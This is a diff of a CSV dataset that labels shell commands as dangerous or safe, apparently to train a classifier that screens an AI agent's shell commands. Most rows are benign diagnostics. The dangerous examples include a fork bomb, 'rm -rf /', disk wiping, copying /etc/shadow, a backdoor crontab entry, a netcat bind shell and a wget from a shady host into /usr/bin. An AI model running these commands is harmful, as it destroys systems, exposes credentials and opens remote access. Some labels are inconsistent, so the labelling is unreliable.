@@ -1,193 +1,372 @@
 command,label,weight
-:(){ :|:& };:,1,1
-apt-get update && apt-get install net-tools -y,0,1
-apt-get upgrade -y,0,1
-apt-key list | grep -i cuda,0,100
-apt list --upgradable,0,100
-apt update,0,100
-apt update && apt list --upgradable,0,100
-apt update && apt upgrade -y,1,100
-apt upgrade,1,100
-apt upgrade gir1.2-nm-1.0 libnm0 network-manager-config-connectivity-ubuntu network-manager,0,1
-apt upgrade -y,1,100
-cat /etc/apt/sources.list,0,1
-cat /etc/apt/sources.list.d/*,0,1
-cat /etc/cron.d/php,0,1
-cat /etc/iptables/rules.v4,0,1
-cat /etc/network/interfaces,0,1
-cat /etc/os-release,0,1
-cat /etc/services,0,1
-cat /etc/ssh/sshd_config,0,1
-cat /etc/shadow,1,100
-cat /home/mike/agentf/workspace/systemcheck/memory/services_list.txt,0,100
-cat /home/mining/public_html/cronjobs/linux/getdata_devices.sh,0,100
-cat /proc/sys/net/ipv4/ip_forward,0,1
-cat /var/log/apt/ubuntu-advantage-apt-hook.log,0,100
-cat /var/log/syslog,0,100
-cp /etc/ssh/sshd_config /tmp/sshd_backup,0,1
-cp /etc/shadow /tmp/stolen_hashes,1,100
-curl -sSL https://install.sh
-chmod -R 777 /,1,1
-chown -R root:root /,1,1
-crontab -l,0,1
-crontab -r,1,100
-curl -I google.com,0,10
-date,0,10
-dd if=/dev/zero of=/dev/sda,1,1
-df -h,0,1
-df -i,0,100
-df -i /mnt/models,0,100
-docker exec container1 top -n 1 -b,0,1
-docker exec {container_id} /bin/bash,1,100
-docker exec open-webui /bin/sh -c 'ps aux --sort=-%cpu | head -n 5',0,1
-docker exec open-webui /bin/sh -c 'which ps',0,1
-docker exec open-webui ps aux --sort=-%cpu | head -n 5,0,1
-docker exec open-webui top -n 1 -b,0,1
-docker exec open-webui which ps,0,1
-docker inspect container1,0,1
-docker inspect -f '{{json .State}}' a5325fab101e,0,1
-docker inspect -f '{{json .State.Health}}' a5325fab101e,0,1
-docker inspect -f '{{ .State }}' a5325fab101e,0,1
-docker inspect -f '{{.State}}' a5325fab101e,0,1
-docker inspect -f '{{ .State.Health }}' a5325fab101e,0,1
-docker inspect -f '{{.State.Health}}' a5325fab101e,0,1
-docker inspect -f '{{ .State.Health.Status }}' a5325fab101e,0,1
-docker inspect -f '{{.State.Health.Status}}' a5325fab101e,0,1
-docker inspect -f '{{.State.Health.Status}}' open-webui,0,1
-docker inspect -f '{{.State.Status}}' 1a473daf5cc5,0,1
-docker inspect -f '{{.State.Status}}' a5325fab101e,0,1
-docker inspect -f '{{.State.Status}}' e871a31459fe,0,1
-docker inspect -f '{{.State.Status}}' open-webui,0,1
-docker inspect open-webui,0,1
-docker logs a5325fab101e,0,1
-docker logs e871a31459fe,0,100
-docker ps,0,1
-docker ps -a,0,10
-docker ps --format 'table {{.ID}}	{{.Names}}',0,1
-docker stats --no-stream,0,1
-du -sh /mnt/models/*,0,100
-echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab,1,100
-echo 'Password is required for sudo' | sudo -S /usr/bin/true,0,1
-echo 'root:password' | chpasswd,1,1
-echo 'root:password' | chpasswd,1,100
-fdisk,1,1
-free -h,0,1
-free -m,0,10
-git status,0,5
-init 0,1,1
-iptables -F,1,1
-ip addr show,0,1
-journalctl --no-pager -n 50,0,100
-journalctl --no-pager -u docker.service,0,1
-journalctl -u plymouth-start.service,0,100
-lsblk,0,100
-ls /etc,0,1
-ls /etc/apt/sources.list.d,0,1
-ls /etc/iptables/rules.v4,0,100
-ls /etc/network/interfaces.d,0,1
-ls /etc/services,0,100
-ls -l /etc,0,1
-ls -l /etc/apt/sources.list.d,0,1
-ls -l /etc/apt/trusted.gpg,0,100
-ls -l /etc/cron.d,0,1
-ls -l /etc/ | grep ssh,0,1
-ls -l /etc/init.d/get_systemdata.sh,0,100
-ls -l /etc/iptables,0,100
-ls -l /etc/iptables/rules.v4,0,1
-ls -l /etc/network/interfaces,0,1
-ls -l /etc/resolv.conf,0,1
-ls -l /etc/services,0,1
-ls -l /etc/ssh/,0,1
-ls -l /etc/ssh/sshd_config,0,1
-ls -l /home/mining/public_html/cronjobs/linux/,0,100
-ls -l /tmp/testfile,0,100
-ls -l /var/log/syslog,0,1
-lsof | sort -k 7 -n -r,0,1
-ls /var/log,0,1
-mkdir /etc/iptables,1,100
-mkdir -p /etc/iptables,1,100
-mkdir -p /tmp/iptables,0,100
-mkfs.ext4 /dev/,1,1
-netstat,0,1
-netstat -tuln,0,10
-netstat -tuln || ss -tuln,0,100
-nc -lvp 4444 -e /bin/bash,1,100
-openssl x509 -noout -text -in cert.pem,0,10
-parted /dev/sda rm 1,1,1
-passwd -d root,1,100
-ping -c 4 10.0.0.1,0,1
-ping -c 4 127.0.0.1,0,100
-ping -c 4 192.168.1.1,0,100
-ping -c 4 8.8.8.8,0,1
-ping -c 4 example.com,0,1
-ping -c 4 google.com,0,100
-powershell -Command ...,1,1
-ps auxf | grep nginx,0,100
-ps aux | grep 'a5325fab101e',0,1
-ps aux | grep apache2,0,100
-ps aux | grep 'docker',0,1
-ps aux | grep docker,0,1
-ps aux | grep sshd,0,1
-ps aux --sort=-%cpu | head -n 5,0,1
-ps -ef,0,1
-ps -ef | grep network,0,1
-ps -ef | grep sshd,0,1
-pwd,0,15
-python3 --version,0,5
-reboot,1,1
-rm -rf /,1,1
-shutdown -h now,1,1
-ss -tuln,0,100
-ssh -R 8080:localhost:80 tunnel.com,1,80
-sudo -v,0,1
-systemctl disable apport-autoreport.service,0,1
-systemctl disable whoopsie.path,0,1
-systemctl enable --now nc-listener.service,1,50
-systemctl is-system-running,0,100
-systemctl list-units --type=service --all,0,100
-systemctl list-units --type=service --all -o status,0,100
-systemctl list-units --type=service --state=active,0,100
-systemctl list-units --type=service --state=running,0,100
-systemctl list-units --type=service --state=running -o short,0,100
-systemctl restart ssh,1,10
-systemctl status apport-autoreport.service,0,100
-systemctl status plymouth-start.service,0,100
-systemctl status postfix,0,100
-tail -n 100 /var/log/syslog,0,10
-top -n 1,0,12
-top -n 1 -b,0,1
-touch /tmp/testfile,0,1
-ufw allow 22/tcp,1,20
-uname -a,0,10
-uptime,0,10
-userdel -r,1,1
-userdel -r,1,100
-usermod -aG sudo username,1,100
-visudo -c,0,1
-whoami,0,5
-wget http://trusted.com/patch.zip -P /tmp,0,10
-wget http://shady.com/x.sh -O /usr/bin/update,1,100
-tar -xvf logs.tar.gz -C /var/log,0,5
-ls /home/username,0,100
-echo 'YourPasswordHere' | sudo -S smartctl -a /dev/sda,1,100
-echo ""your_password"" | sudo -S smartctl -a /dev/sda,1,100
-passwd username,1,100
-ls -l /home/username,0,100
-smartctl -a /dev/sdb,1,100
-smartctl -a /dev/sda,1,100
-cat /etc/netplan/50-cloud-init.yaml,0,100
-sudo apt autoremove -y,0,100
-journalctl --no-pager -f,0,100
-which netstat,0,100
-dpkg -l | grep net-tools,0,100
-apt update,0,100
-dmidecode memory,0,100
-lsof / && find / -type f -exec file {} +,0,100
-ip a,0,100
-which ss,0,100
-ps aux,0,100
-cat /etc/passwd,0,100
-ss -tuln,0,100
-echo 'your_sudo_password' | sudo -S ls /home/username,0,100
-
-
+:(){ :|:& };:,1.0,1.0
+apt-get update && apt-get install net-tools -y,0.0,1.0
+apt-get upgrade -y,0.0,1.0
+apt-key list | grep -i cuda,0.0,1.0
+apt list --upgradable,0.0,1.0
+apt update,0.0,1.0
+apt update && apt list --upgradable,0.0,1.0
+apt update && apt upgrade -y,1.0,1.0
+apt upgrade,1.0,1.0
+apt upgrade gir1.2-nm-1.0 libnm0 network-manager-config-connectivity-ubuntu network-manager,0.0,1.0
+apt upgrade -y,1.0,1.0
+cat /etc/apt/sources.list,0.0,1.0
+cat /etc/apt/sources.list.d/*,0.0,1.0
+cat /etc/cron.d/php,0.0,1.0
+cat /etc/iptables/rules.v4,0.0,1.0
+cat /etc/network/interfaces,0.0,1.0
+cat /etc/os-release,0.0,1.0
+cat /etc/services,0.0,1.0
+cat /etc/ssh/sshd_config,0.0,1.0
+cat /etc/shadow,1.0,1.0
+cat /home/mike/agentf/workspace/systemcheck/memory/services_list.txt,0.0,1.0
+cat /home/mining/public_html/cronjobs/linux/getdata_devices.sh,0.0,1.0
+cat /proc/sys/net/ipv4/ip_forward,0.0,1.0
+cat /var/log/apt/ubuntu-advantage-apt-hook.log,0.0,1.0
+cat /var/log/syslog,0.0,1.0
+cp /etc/ssh/sshd_config /tmp/sshd_backup,0.0,1.0
+cp /etc/shadow /tmp/stolen_hashes,1.0,1.0
+chmod -R 777 /,1.0,1.0
+chown -R root:root /,1.0,1.0
+crontab -l,0.0,1.0
+crontab -r,1.0,1.0
+curl -I google.com,0.0,10.0
+date,0.0,10.0
+dd if=/dev/zero of=/dev/sda,1.0,1.0
+df -h,0.0,1.0
+df -i,0.0,1.0
+df -i /mnt/models,0.0,1.0
+docker exec container1 top -n 1 -b,0.0,1.0
+docker exec {container_id} /bin/bash,1.0,1.0
+docker exec open-webui /bin/sh -c 'ps aux --sort=-%cpu | head -n 5',0.0,1.0
+docker exec open-webui /bin/sh -c 'which ps',0.0,1.0
+docker exec open-webui ps aux --sort=-%cpu | head -n 5,0.0,1.0
+docker exec open-webui top -n 1 -b,0.0,1.0
+docker exec open-webui which ps,0.0,1.0
+docker inspect container1,0.0,1.0
+docker inspect -f '{{json .State}}' a5325fab101e,0.0,1.0
+docker inspect -f '{{json .State.Health}}' a5325fab101e,0.0,1.0
+docker inspect -f '{{ .State }}' a5325fab101e,0.0,1.0
+docker inspect -f '{{.State}}' a5325fab101e,0.0,1.0
+docker inspect -f '{{ .State.Health }}' a5325fab101e,0.0,1.0
+docker inspect -f '{{.State.Health}}' a5325fab101e,0.0,1.0
+docker inspect -f '{{ .State.Health.Status }}' a5325fab101e,0.0,1.0
+docker inspect -f '{{.State.Health.Status}}' a5325fab101e,0.0,1.0
+docker inspect -f '{{.State.Health.Status}}' open-webui,0.0,1.0
+docker inspect -f '{{.State.Status}}' 1a473daf5cc5,0.0,1.0
+docker inspect -f '{{.State.Status}}' a5325fab101e,0.0,1.0
+docker inspect -f '{{.State.Status}}' e871a31459fe,0.0,1.0
+docker inspect -f '{{.State.Status}}' open-webui,0.0,1.0
+docker inspect open-webui,0.0,1.0
+docker logs a5325fab101e,0.0,1.0
+docker logs e871a31459fe,0.0,1.0
+docker ps,0.0,1.0
+docker ps -a,0.0,10.0
+docker ps --format 'table {{.ID}}	{{.Names}}',0.0,1.0
+docker stats --no-stream,0.0,1.0
+du -sh /mnt/models/*,0.0,1.0
+echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab,1.0,1.0
+echo 'Password is required for sudo' | sudo -S /usr/bin/true,0.0,1.0
+echo 'root:password' | chpasswd,1.0,1.0
+echo 'root:password' | chpasswd,1.0,1.0
+fdisk,1.0,1.0
+free -h,0.0,1.0
+free -m,0.0,10.0
+git status,0.0,5.0
+init 0,1.0,1.0
+iptables -F,1.0,1.0
+ip addr show,0.0,1.0
+journalctl --no-pager -n 50,0.0,1.0
+journalctl --no-pager -u docker.service,0.0,1.0
+journalctl -u plymouth-start.service,0.0,1.0
+lsblk,0.0,1.0
+ls /etc,0.0,1.0
+ls /etc/apt/sources.list.d,0.0,1.0
+ls /etc/iptables/rules.v4,0.0,1.0
+ls /etc/network/interfaces.d,0.0,1.0
+ls /etc/services,0.0,1.0
+ls -l /etc,0.0,1.0
+ls -l /etc/apt/sources.list.d,0.0,1.0
+ls -l /etc/apt/trusted.gpg,0.0,1.0
+ls -l /etc/cron.d,0.0,1.0
+ls -l /etc/ | grep ssh,0.0,1.0
+ls -l /etc/init.d/get_systemdata.sh,0.0,1.0
+ls -l /etc/iptables,0.0,1.0
+ls -l /etc/iptables/rules.v4,0.0,1.0
+ls -l /etc/network/interfaces,0.0,1.0
+ls -l /etc/resolv.conf,0.0,1.0
+ls -l /etc/services,0.0,1.0
+ls -l /etc/ssh/,0.0,1.0
+ls -l /etc/ssh/sshd_config,0.0,1.0
+ls -l /home/mining/public_html/cronjobs/linux/,0.0,1.0
+ls -l /tmp/testfile,0.0,1.0
+ls -l /var/log/syslog,0.0,1.0
+lsof | sort -k 7 -n -r,0.0,1.0
+ls /var/log,0.0,1.0
+mkdir /etc/iptables,1.0,1.0
+mkdir -p /etc/iptables,1.0,1.0
+mkdir -p /tmp/iptables,0.0,1.0
+mkfs.ext4 /dev/,1.0,1.0
+netstat,0.0,1.0
+netstat -tuln,0.0,10.0
+netstat -tuln || ss -tuln,0.0,1.0
+nc -lvp 4444 -e /bin/bash,1.0,1.0
+openssl x509 -noout -text -in cert.pem,0.0,10.0
+parted /dev/sda rm 1,1.0,1.0
+passwd -d root,1.0,1.0
+ping -c 4 10.0.0.1,0.0,1.0
+ping -c 4 127.0.0.1,0.0,1.0
+ping -c 4 192.168.1.1,0.0,1.0
+ping -c 4 8.8.8.8,0.0,1.0
+ping -c 4 example.com,0.0,1.0
+ping -c 4 google.com,0.0,1.0
+powershell -Command ...,1.0,1.0
+ps auxf | grep nginx,0.0,1.0
+ps aux | grep 'a5325fab101e',0.0,1.0
+ps aux | grep apache2,0.0,1.0
+ps aux | grep 'docker',0.0,1.0
+ps aux | grep docker,0.0,1.0
+ps aux | grep sshd,0.0,1.0
+ps aux --sort=-%cpu | head -n 5,0.0,1.0
+ps -ef,0.0,1.0
+ps -ef | grep network,0.0,1.0
+ps -ef | grep sshd,0.0,1.0
+pwd,0.0,15.0
+python3 --version,0.0,5.0
+reboot,1.0,1.0
+rm -rf /,1.0,1.0
+shutdown -h now,1.0,1.0
+ss -tuln,0.0,1.0
+ssh -R 8080:localhost:80 tunnel.com,1.0,80.0
+sudo -v,0.0,1.0
+systemctl disable apport-autoreport.service,0.0,1.0
+systemctl disable whoopsie.path,0.0,1.0
+systemctl enable --now nc-listener.service,1.0,50.0
+systemctl is-system-running,0.0,1.0
+systemctl list-units --type=service --all,0.0,1.0
+systemctl list-units --type=service --all -o status,0.0,1.0
+systemctl list-units --type=service --state=active,0.0,1.0
+systemctl list-units --type=service --state=running,0.0,1.0
+systemctl list-units --type=service --state=running -o short,0.0,1.0
+systemctl restart ssh,1.0,10.0
+systemctl status apport-autoreport.service,0.0,1.0
+systemctl status plymouth-start.service,0.0,1.0
+systemctl status postfix,0.0,1.0
+tail -n 100 /var/log/syslog,0.0,10.0
+top -n 1,0.0,12.0
+top -n 1 -b,0.0,1.0
+touch /tmp/testfile,0.0,1.0
+ufw allow 22/tcp,1.0,20.0
+uname -a,0.0,10.0
+uptime,0.0,10.0
+userdel -r,1.0,1.0
+userdel -r,1.0,1.0
+usermod -aG sudo username,1.0,1.0
+visudo -c,0.0,1.0
+whoami,0.0,5.0
+wget http://trusted.com/patch.zip -P /tmp,0.0,10.0
+wget http://shady.com/x.sh -O /usr/bin/update,1.0,1.0
+tar -xvf logs.tar.gz -C /var/log,0.0,5.0
+ls /home/username,0.0,1.0
+echo 'YourPasswordHere' | sudo -S smartctl -a /dev/sda,1.0,1.0
+"echo """"your_password"""" | sudo -S smartctl -a /dev/sda",1.0,1.0
+passwd username,1.0,1.0
+ls -l /home/username,0.0,1.0
+smartctl -a /dev/sdb,1.0,1.0
+smartctl -a /dev/sda,1.0,1.0
+cat /etc/netplan/50-cloud-init.yaml,0.0,1.0
+sudo apt autoremove -y,0.0,1.0
+journalctl --no-pager -f,0.0,1.0
+which netstat,0.0,1.0
+dpkg -l | grep net-tools,0.0,1.0
+apt update,0.0,1.0
+dmidecode memory,0.0,1.0
+lsof / && find / -type f -exec file {} +,0.0,1.0
+ip a,0.0,1.0
+which ss,0.0,1.0
+ps aux,0.0,1.0
+cat /etc/passwd,0.0,1.0
+ss -tuln,0.0,1.0
+echo 'your_sudo_password' | sudo -S ls /home/username,0.0,1.0
+pgrep -af 'apache2|nginx|mysql|mariadb|php-fpm',0.0,1.0
+ss -tulpn,0.0,1.0
+systemctl is-active apache2 mysql || true,0.0,1.0
+systemctl is-active mysql apache2,0.0,1.0
+apachectl configtest,0.0,1.0
+dmesg | grep -Ei 'oom|segfault|mysql|apache2' | tail -n 20,0.0,1.0
+dpkg -l | grep -E 'apache2|nginx|mysql|mariadb|php-fpm' || true,0.0,1.0
+mysqld --validate-config,0.0,1.0
+tail -n 50 /var/log/mysql/error.log,0.0,1.0
+df -h /var/lib/mysql /var/log,0.0,1.0
+pgrep -a apache,0.0,1.0
+ss -tulpn | grep -E ':80|:443',0.0,1.0
+apt-get update,0.0,1.0
+dmesg | grep -iE 'oom-killer|segfault|error' | tail -n 20,0.0,1.0
+dpkg -l | grep -v '^ii' | grep -v '^rc' | grep -v '^hi',0.0,1.0
+vcgencmd get_throttled || echo 'vcgencmd not available',0.0,1.0
+dpkg --audit,0.0,1.0
+ls -l /usr/share/keyrings/nodesource.gpg,0.0,1.0
+dmesg | grep -i 'voltage' || echo 'No voltage issues',0.0,1.0
+pgrep -a apache2 || pgrep -a httpd,0.0,1.0
+systemctl list-units --state=failed --no-legend,0.0,1.0
+date && dmesg | tail -n 50,0.0,1.0
+ss -tulpn | grep ':80' || echo 'Port_80_idle',0.0,1.0
+pgrep -a apache || echo 'Apache_not_running',0.0,1.0
+systemctl list-unit-files | grep -E 'apache2|nginx|mysql|mariadb|php.*-fpm',0.0,100.0
+ss -tulpn,0.0,1.0
+journalctl -u mysql --no-pager -n 20,0.0,1.0
+systemctl status mysql --no-pager,0.0,1.0
+"df -h && which smartctl && lsblk -d -n -o NAME,TYPE | grep disk",0.0,1.0
+for dev in sda sdb sdc; do /usr/sbin/smartctl -H /dev/$dev; done,0.0,1.0
+"lsblk -o NAME,SIZE,FSTYPE,MOUNTPOINT,MODEL /dev/sdb",0.0,1.0
+smartctl -H /dev/sdb,0.0,1.0
+df -h && smartctl -H /dev/sda && smartctl -H /dev/sdc,0.0,1.0
+smartctl -d sat -H /dev/sdc || smartctl -d scsi -H /dev/sdc,0.0,1.0
+smartctl -H /dev/sda && smartctl -H /dev/sdb,0.0,1.0
+df -h && smartctl -H /dev/sdc,0.0,1.0
+smartctl --scan && smartctl -H /dev/sda && smartctl -H /dev/sdb && (smartctl -d sat -H /dev/sdc || smartctl -d scsi -H /dev/sdc || echo 'sdc_unsupported'),0.0,1.0
+"lsblk -o NAME,MODEL,SIZE,FSTYPE,MOUNTPOINT && for dev in /dev/sd[a-b]; do smartctl -H $dev; done && find /var/log /tmp -type f -size +500M -exec ls -lh {} +",0.0,1.0
+smartctl -A /dev/sda && smartctl -A /dev/sdb,0.0,1.0
+smartctl -A /dev/sdc || smartctl -d sat -A /dev/sdc,0.0,1.0
+df -h && lsblk /dev/sdc,0.0,1.0
+sudo smartctl -H /dev/sda && sudo smartctl -H /dev/sdb,0.0,1.0
+"sudo lsblk -d -o NAME,SIZE,TYPE,MODEL && sudo smartctl -H /dev/sda && sudo smartctl -H /dev/sdb",0.0,1.0
+sudo smartctl -l error /dev/sda && df -h,0.0,1.0
+(echo '--- OS/KERNEL ---'; uname -a; cat /etc/os-release; echo '--- CPU ---'; lscpu; echo '--- MEMORY ---'; free -m; echo '--- DISKS ---'; lsblk -f; echo '--- PCI ---'; lspci; echo '--- USB ---'; lsusb; echo '--- NETWORK ---'; ip addr; echo '--- APACHE/PORT 80 ---'; pgrep -a apache; ss -tulpn | grep ':80'; journalctl -u apache2 -n 20 --no-pager) > /home/lgate/.local/share/honeybeebash/workspace/system-info/default/memory/INFORMATION 2>&1,0.0,1.0
+lscpu,0.0,1.0
+pgrep -a apache > /home/lgate/.local/share/honeybeebash/workspace/system-info/default/memory/INFORMATION 2>&1 || echo 'No Apache process found' >> /home/lgate/.local/share/honeybeebash/workspace/system-info/default/memory/INFORMATION,0.0,1.0
+ss -tulpn | grep :80 >> /home/lgate/.local/share/honeybeebash/workspace/system-info/default/memory/INFORMATION 2>&1 || echo 'Port 80 not bound' >> /home/lgate/.local/share/honeybeebash/workspace/system-info/default/memory/INFORMATION,0.0,1.0
+pgrep -a apache > /home/lgate/.local/share/honeybeebash/workspace/system-info/default/memory/INFORMATION 2>&1 || echo 'Apache: No process found' >> /home/lgate/.local/share/honeybeebash/workspace/system-info/default/memory/INFORMATION,0.0,1.0
+journalctl -u apache2 --no-pager -n 20 >> /home/lgate/.local/share/honeybeebash/workspace/system-info/default/memory/INFORMATION 2>&1 || echo 'Apache Journal: Entry not found or access denied' >> /home/lgate/.local/share/honeybeebash/workspace/system-info/default/memory/INFORMATION,0.0,1.0
+lscpu >> /home/lgate/.local/share/honeybeebash/workspace/system-info/default/memory/INFORMATION,0.0,1.0
+dpkg -l | grep -E 'mysql-server|nginx|apache2|php.*-fpm',0.0,1.0
+dpkg -l | grep -E 'apache2|nginx|mysql-server|mariadb-server|php.*-fpm',0.0,1.0
+snap list,0.0,100.0
+find /etc/systemd/system /lib/systemd/system -name '*nginx*' -o -name '*apache*' -o -name '*mysql*' -o -name '*mariadb*' -o -name '*php*' 2>/dev/null,0.0,1.0
+grep -E 'mysql|www-data|nginx|apache|php' /etc/passwd,0.0,1.0
+dpkg-query -W -f='${Status} ${Package}\n' apache2 nginx mysql-server mariadb-server php-fpm 2>/dev/null || ls /usr/sbin/nginx /usr/sbin/apache2 /usr/sbin/mysqld,0.0,1.0
+ss -tulpn | grep -E ':80|:443|:3306|:9000',0.0,1.0
+systemctl list-units --failed,0.0,100.0
+ls -F /usr/sbin/nginx /usr/sbin/apache2 /usr/sbin/mysqld /usr/sbin/mariadbd /usr/sbin/php-fpm* /usr/bin/mysql 2>/dev/null,0.0,1.0
+ls -l /usr/sbin/nginx /usr/sbin/apache2 /usr/sbin/mysqld /usr/sbin/mariadbd /usr/sbin/php-fpm* 2>/dev/null,0.0,1.0
+find /etc -maxdepth 2 -name '*nginx*' -o -name '*apache*' -o -name '*mysql*' -o -name '*mariadb*' -o -name '*php*',0.0,1.0
+ls -d /etc/nginx /etc/php 2>/dev/null,0.0,1.0
+ss -lntp,0.0,100.0
+dpkg-query -W -f='${Status} ${Package}\n' apache2,0.0,1.0
+ss -tulpn | grep -E ':80|:443|:9000',0.0,100.0
+which nginx apache2 mysql mariadb php 2>/dev/null,0.0,100.0
+snap list 2>/dev/null,0.0,100.0
+docker ps -a 2>/dev/null || podman ps -a 2>/dev/null,0.0,1.0
+ls /etc/init.d,0.0,100.0
+readlink -f /etc/alternatives/my.cnf,0.0,1.0
+ss -tln,0.0,100.0
+systemctl status lighttpd --no-pager,0.0,100.0
+whereis nginx apache2 mysql mariadb php-fpm,0.0,100.0
+find /lib/systemd/system /etc/systemd/system -name '*nginx*' -o -name '*apache2*' -o -name '*mysql*' -o -name '*mariadb*' -o -name '*php*-fpm*',0.0,1.0
+which nginx apache2 mysqld php-fpm,0.0,100.0
+docker ps -a --filter 'name=nginx' --filter 'name=apache' --filter 'name=mysql' --filter 'name=mariadb' --filter 'name=php',0.0,1.0
+docker ps -a --format '{{.ID}}	{{.Image}}	{{.Status}}	{{.Names}}',0.0,1.0
+docker ps -a --format 'table {{.Names}}	{{.Status}}	{{.Image}}' | grep -E 'nginx|apache|mysql|mariadb|php',0.0,1.0
+systemctl --failed,0.0,100.0
+systemctl --failed --all,0.0,100.0
+"dmesg --level=err,warn",0.0,1.0
+"lsblk -o NAME,SIZE,TYPE,FSTYPE,MOUNTPOINT,MODEL /dev/sdb",0.0,1.0
+journalctl -p 3 -xb -n 50,0.0,1.0
+"printf ""[CRITICAL] Storage: /dev/sda 21 pending sectors\n[CRITICAL] Storage: /dev/sdb SMART Attribute 184 failure\n[ERROR] Kernel: ata4/sdb I/O errors detected\n[ERROR] Service: snap.firmware-updater.firmware-notifier failed\n[WARNING] System: smartd mailer missing\n"" >> /home/lgate/.local/share/honeybeebash/workspace/monitor/default/memory/WARNINGS",0.0,1.0
+journalctl -u snap.firmware-updater.firmware-notifier --no-pager -n 50,0.0,1.0
+systemctl status snap.firmware-updater.firmware-notifier,0.0,1.0
+pgrep -a apache || pgrep -a nginx || pgrep -a httpd,0.0,1.0
+smartctl -H /dev/sdb,0.0,1.0
+smartctl -A /dev/sda,0.0,1.0
+"grep -E ""^anonymous_enable|^ssl_enable"" /etc/vsftpd.conf",0.0,1.0
+systemctl is-active vsftpd,0.0,1.0
+"grep -i ""anonymous_enable"" /etc/vsftpd.conf",0.0,1.0
+"printf ""[SECURITY] Service: vsftpd allows anonymous login\n[SECURITY] Service: vsftpd SSL/TLS is disabled\n"" >> /home/lgate/.local/share/honeybeebash/workspace/monitor/default/memory/WARNINGS",0.0,1.0
+ufw status,0.0,1.0
+"printf ""[SECURITY] Firewall: ufw is inactive\n"" >> /home/lgate/.local/share/honeybeebash/workspace/monitor/default/memory/WARNINGS",0.0,1.0
+"grep -E ""^PermitRootLogin|^PasswordAuthentication"" /etc/ssh/sshd_config",0.0,1.0
+"sshd -T | grep -E ""permitrootlogin|passwordauthentication""",0.0,1.0
+systemctl is-active fail2ban,0.0,1.0
+awk -F: '($3 == 0) { print $1 }' /etc/passwd | grep -v '^root$',0.0,1.0
+find /etc -xdev -type f -perm -o+w,0.0,1.0
+ls -1 /var/crash,0.0,1.0
+"printf ""[ERROR] System: Crash reports detected for honeybee detector script in /var/crash
+"" >> /home/lgate/.local/share/honeybeebash/workspace/monitor/default/memory/WARNINGS",0.0,1.0
+dpkg -l | grep -v '^ii' | grep -v '^rc' | grep -v '^hi' | grep -v '^un',0.0,1.0
+"journalctl -k | grep -i ""oom-kill""",0.0,1.0
+find /usr/bin /usr/sbin /bin /sbin -xdev -type f -perm -o+w,0.0,1.0
+iptables -L -n -v,0.0,1.0
+ls -l /proc/*/exe 2>/dev/null | grep -E '/tmp/|/dev/shm/|/var/tmp/',0.0,1.0
+"printf ""[SECURITY] SSH: 50 failed password attempts for user 'ssh2' detected\n"" >> /home/lgate/.local/share/honeybeebash/workspace/monitor/default/memory/WARNINGS",0.0,1.0
+timedatectl status,0.0,1.0
+"awk -F: '($2 == """" ) { print $1 }' /etc/shadow",0.0,1.0
+"ls -l /proc/*/exe 2>/dev/null | grep ""(deleted)"" && printf ""[SECURITY] Process: Running process with deleted executable detected
+"" >> /home/lgate/.local/share/honeybeebash/workspace/monitor/default/memory/WARNINGS || true",0.0,1.0
+"find / -xdev -type f -perm -o+w -not -path ""/proc/*"" -not -path ""/sys/*"" -not -path ""/dev/*"" -not -path ""/tmp/*"" -not -path ""/var/tmp/*"" -exec ls -l {} +",0.0,1.0
+"printf ""[SECURITY] Files: World-writable files detected in Steam/Proton directories in /home/lgate/
+"" >> /home/lgate/.local/share/honeybeebash/workspace/monitor/default/memory/WARNINGS",0.0,1.0
+"systemctl is-system-running --full || printf ""[ERROR] System: System state is $(systemctl is-system-running)
+"" >> /home/lgate/.local/share/honeybeebash/workspace/monitor/default/memory/WARNINGS",0.0,1.0
+sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding,0.0,1.0
+"systemctl is-active unattended-upgrades || printf ""[WARNING] Security: unattended-upgrades service is inactive
+"" >> /home/lgate/.local/share/honeybeebash/workspace/monitor/default/memory/WARNINGS",0.0,1.0
+"awk -F: '($3 == 0 && $1 != ""root"") {print ""[SECURITY] User: Non-root user with UID 0: "" $1}' /etc/passwd >> /home/lgate/.local/share/honeybeebash/workspace/monitor/default/memory/WARNINGS",0.0,1.0
+ls -ld /bin /sbin /usr/bin /usr/sbin,0.0,1.0
+"dmesg --level=err,warn | tail -n 50",0.0,1.0
+snap services,0.0,1.0
+systemctl --failed --no-legend --no-pager,0.0,1.0
+"pgrep -a apache || echo ""No apache process found.""",0.0,1.0
+"ss -tulpn | grep :80 || echo ""Port 80 is idle.""",0.0,1.0
+"df -hT && lsblk -o NAME,SIZE,FSTYPE,MOUNTPOINT && which smartctl || echo 'smartctl_missing'",0.0,100.0
+/usr/sbin/smartctl -H /dev/sda && /usr/sbin/smartctl -H /dev/sdb,0.0,1.0
+find /var/log /tmp -type f -size +100M -exec du -sh {} + 2>/dev/null,0.0,1.0
+"df -h --output=source,pcent,target",0.0,100.0
+cat /etc/fstab,0.0,1.0
+cat /home/lgate/.local/share/honeybeebash/workspace/default/default/memory/WARNINGS,0.0,1.0
+"dmesg | grep -iE ""oom|segfault|page fault"" | tail -n 20",0.0,1.0
+apt update 2>&1,0.0,1.0
+pactl list sinks,0.0,1.0
+sudo -u lgate XDG_RUNTIME_DIR=/run/user/1000 pactl info; sudo -u lgate XDG_RUNTIME_DIR=/run/user/1000 pactl list sink-inputs,0.0,1.0
+sudo -u lgate XDG_RUNTIME_DIR=/run/user/1000 pactl set-default-sink alsa_output.pci-0000_00_1b.0.analog-stereo && sudo -u lgate XDG_RUNTIME_DIR=/run/user/1000 pactl move-sink-input 109 alsa_output.pci-0000_00_1b.0.analog-stereo,0.0,1.0
+sudo -u lgate amixer -c 0 scontents,0.0,1.0
+sudo -u lgate XDG_RUNTIME_DIR=/run/user/1000 pactl set-sink-volume alsa_output.pci-0000_00_1b.0.analog-stereo 100% && sudo -u lgate amixer -c 0 sset Headphone unmute 100% && sudo -u lgate amixer -c 0 sset 'Auto-Mute Mode' Disabled,0.0,1.0
+sudo -u lgate amixer -c 0 sset Master unmute 100% && sudo -u lgate amixer -c 0 sset Speaker unmute 100% && sudo -u lgate amixer -c 0 sset PCM 100%,0.0,1.0
+sudo -u lgate amixer -c 0 sset Front unmute 100% && sudo -u lgate amixer -c 0 sset PCM 100%,0.0,1.0
+ps aux | grep -E 'pipewire|wireplumber|pulse' && sudo fuser -v /dev/snd/*,0.0,1.0
+aplay -l,0.0,1.0
